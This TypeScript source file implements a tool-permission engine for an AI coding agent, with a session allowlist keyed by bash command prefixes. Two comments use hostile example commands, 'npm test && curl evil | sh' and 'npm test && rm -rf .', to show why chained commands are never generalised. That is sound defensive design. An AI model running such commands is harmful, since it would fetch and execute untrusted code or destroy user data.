import type { PermissionDecision } from "@agent/core";

export interface PermissionRequest {
  readonly tool: string;
  readonly input: unknown;
  readonly agent: string;
}

export interface PermissionPrompter {
  ask(request: PermissionRequest): Promise<boolean>;
}

/**
 * A runtime "already answered" layer consulted between the static rules and
 * the prompter — see {@link SessionAllowlist} for the implementation the CLI
 * feeds from its `[y/n/a]` prompt.
 */
export interface PermissionOverlay {
  allows(request: PermissionRequest): boolean;
}

export interface PermissionEngineOptions {
  readonly defaultDecision?: PermissionDecision;
  readonly prompter?: PermissionPrompter;
  /**
   * Consulted only for requests that would otherwise be prompted: an `allow`
   * rule needs no help and a `deny` rule is never overridden by it.
   */
  readonly overlay?: PermissionOverlay;
}

export interface PermissionResult {
  readonly allowed: boolean;
  readonly decision: PermissionDecision;
  readonly reason?: string;
}

/** Reason returned when a rule explicitly denies the tool. */
export const DENIED_BY_POLICY = "denied by policy";
/** Reason returned when a decision needs a prompt but no prompter is wired up. */
export const NO_PROMPTER_AVAILABLE =
  "no prompter available in non-interactive mode";
/** Reason returned when the prompter was asked and refused. */
export const DENIED_BY_PROMPTER = "denied by prompter";
/** Reason returned when the session overlay had already approved this shape. */
export const ALLOWED_FOR_SESSION = "allowed for this session";

/** The tool whose requests are remembered by command prefix rather than by name. */
const BASH_TOOL = "bash";

/**
 * Tokens accepted as a subcommand — the second word of a `git log` or
 * `npm test`. A word carrying a `.` or a `/` is a path or a file name, not a
 * subcommand, so `cat src/x.ts` narrows to `cat` rather than to `cat src/x.ts`.
 */
const SUBCOMMAND = /^[A-Za-z][A-Za-z0-9_:-]*$/;

/**
 * Anything that makes a command line more than one simple invocation:
 * operators, redirections, substitutions, grouping, or a second line.
 *
 * A command containing any of these gets no prefix at all — neither for
 * remembering nor for matching — because a prefix cannot speak for what comes
 * after the operator: `npm test && curl evil | sh` starts with `npm test`.
 */
const SHELL_OPERATORS = /[;&|<>`$(){}\n\r]/;

/** The rule that answering "always" adds for one request. */
export type SessionRule =
  | { readonly kind: "bash-prefix"; readonly prefix: string }
  | { readonly kind: "tool"; readonly tool: string };

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null && !Array.isArray(value);
}

function commandOf(input: unknown): string | undefined {
  if (!isRecord(input)) return undefined;
  const command = input.command;
  return typeof command === "string" ? command : undefined;
}

/**
 * The session-scope prefix for a shell command, or `undefined` when none can
 * be derived honestly.
 *
 * The rule, exactly:
 *
 * 1. The command is trimmed; an empty one has no prefix.
 * 2. A command containing any shell operator (`; & | < > \` $ ( ) { }` or a
 *    newline) has no prefix — see {@link SHELL_OPERATORS}.
 * 3. The first token is the head. A head starting with `-` has no prefix.
 * 4. Flags (tokens starting with `-`) after the head are skipped; the first
 *    remaining token, if it looks like a subcommand ({@link SUBCOMMAND} — a
 *    word with no `.` and no `/`), joins the head. Otherwise the head stands
 *    alone.
 *
 * Matching is by *equality of derived prefixes*, never by string prefix, so
 * `npm test --run foo` → `npm test` matches a remembered `npm test`, while
 * `npm publish` → `npm publish` and `npm testfoo` → `npm testfoo` do not.
 *
 * Examples:
 * - `npm test --run foo` → `npm test`
 * - `npm --silent test`  → `npm test`
 * - `npm publish`        → `npm publish`
 * - `git log --oneline`  → `git log`
 * - `ls -la`             → `ls`
 * - `cat src/x.ts`       → `cat`
 * - `npm test && rm -rf .` → `undefined`
 */
export function bashCommandPrefix(command: string): string | undefined {
  const trimmed = command.trim();
  if (trimmed === "") return undefined;
  if (SHELL_OPERATORS.test(trimmed)) return undefined;

  const tokens = trimmed.split(/\s+/);
  const head = tokens[0];
  if (head === undefined || head === "" || head.startsWith("-")) {
    return undefined;
  }

  const argument = tokens.slice(1).find((token) => !token.startsWith("-"));
  if (argument === undefined || !SUBCOMMAND.test(argument)) return head;
  return `${head} ${argument}`;
}

/**
 * The rule an "always allow" answer would add for this request: a command
 * prefix for `bash`, the tool name for everything else. `undefined` means the
 * request cannot be generalised (a compound shell command) and can only ever
 * be allowed once.
 */
export function sessionRuleFor(
  request: PermissionRequest,
): SessionRule | undefined {
  if (request.tool !== BASH_TOOL) {
    return { kind: "tool", tool: request.tool };
  }
  const command = commandOf(request.input);
  if (command === undefined) return undefined;
  const prefix = bashCommandPrefix(command);
  return prefix === undefined ? undefined : { kind: "bash-prefix", prefix };
}

/** Human-readable form of a rule, for prompts and confirmations. */
export function describeSessionRule(rule: SessionRule): string {
  return rule.kind === "tool" ? rule.tool : `${BASH_TOOL} ${rule.prefix} …`;
}

/**
 * Approvals remembered for the lifetime of one process.
 *
 * Deliberately in-memory only: nothing here is written anywhere, so closing
 * the session forgets every rule it learned. Persisted permission config is a
 * separate, later concern.
 */
export class SessionAllowlist implements PermissionOverlay {
  readonly #tools = new Set<string>();
  readonly #bashPrefixes = new Set<string>();

  /**
   * Records the rule for a request. Returns the rule that was added, or
   * `undefined` when the request could not be generalised — the caller should
   * treat that as "allowed this once" and say so.
   */
  remember(request: PermissionRequest): SessionRule | undefined {
    const rule = sessionRuleFor(request);
    if (rule === undefined) return undefined;
    if (rule.kind === "tool") this.#tools.add(rule.tool);
    else this.#bashPrefixes.add(rule.prefix);
    return rule;
  }

  allows(request: PermissionRequest): boolean {
    const rule = sessionRuleFor(request);
    if (rule === undefined) return false;
    return rule.kind === "tool"
      ? this.#tools.has(rule.tool)
      : this.#bashPrefixes.has(rule.prefix);
  }

  /** Every remembered rule, described, in insertion order. Tools first. */
  entries(): readonly string[] {
    return [
      ...[...this.#tools].map((tool) =>
        describeSessionRule({ kind: "tool", tool }),
      ),
      ...[...this.#bashPrefixes].map((prefix) =>
        describeSessionRule({ kind: "bash-prefix", prefix }),
      ),
    ];
  }
}

/**
 * Resolves `allow | ask | deny` decisions for tool invocations.
 *
 * Rules are matched by exact tool name; anything unmatched falls back to
 * `options.defaultDecision` (itself defaulting to `"ask"`).
 *
 * Precedence, highest first: a static `allow` or `deny` rule, then the
 * session {@link PermissionOverlay}, then the prompter. The overlay only ever
 * gets a say on requests that were going to be prompted anyway, which is what
 * keeps an explicit `deny` rule un-overridable by anything a session learned.
 */
export class PermissionEngine {
  readonly #rules: Readonly<Record<string, PermissionDecision>>;
  readonly #defaultDecision: PermissionDecision;
  readonly #prompter: PermissionPrompter | undefined;
  readonly #overlay: PermissionOverlay | undefined;

  constructor(
    rules: Readonly<Record<string, PermissionDecision>>,
    options: PermissionEngineOptions = {},
  ) {
    this.#rules = { ...rules };
    this.#defaultDecision = options.defaultDecision ?? "ask";
    this.#prompter = options.prompter;
    this.#overlay = options.overlay;
  }

  decisionFor(tool: string): PermissionDecision {
    if (!Object.hasOwn(this.#rules, tool)) return this.#defaultDecision;
    return this.#rules[tool] ?? this.#defaultDecision;
  }

  async authorize(request: PermissionRequest): Promise<PermissionResult> {
    const decision = this.decisionFor(request.tool);

    if (decision === "allow") return { allowed: true, decision };
    if (decision === "deny")
      return { allowed: false, decision, reason: DENIED_BY_POLICY };

    if (this.#overlay?.allows(request) === true) {
      return { allowed: true, decision, reason: ALLOWED_FOR_SESSION };
    }

    const prompter = this.#prompter;
    if (prompter === undefined) {
      return { allowed: false, decision, reason: NO_PROMPTER_AVAILABLE };
    }

    const approved = await prompter.ask(request);
    return approved
      ? { allowed: true, decision }
      : { allowed: false, decision, reason: DENIED_BY_PROMPTER };
  }
}
